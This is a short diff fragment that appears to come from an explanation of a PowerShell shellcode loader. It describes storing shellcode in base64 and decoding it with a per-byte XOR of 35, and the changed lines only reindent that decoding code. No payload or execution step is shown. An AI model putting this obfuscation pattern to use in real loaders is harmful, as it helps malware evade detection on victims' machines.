@@ -13,8 +13,8 @@ First the shellcode is stored in base64, this is converted from base64 to hex
 This converted hex shell is then itterated over in a for loop using -bitwise xor to shift the bits, very basic crypto...
 
 
-If ([IntPtr]::size -eq 8) {
-	[Byte[]]$var_code = [System.Convert]::FromBase64String($nuttystring)
+	If ([IntPtr]::size -eq 8) {
+		[Byte[]]$var_code = [System.Convert]::FromBase64String($nuttystring)
 
 	for ($x = 0; $x -lt $var_code.Count; $x++) {
 		$var_code[$x] = $var_code[$x] -bxor 35
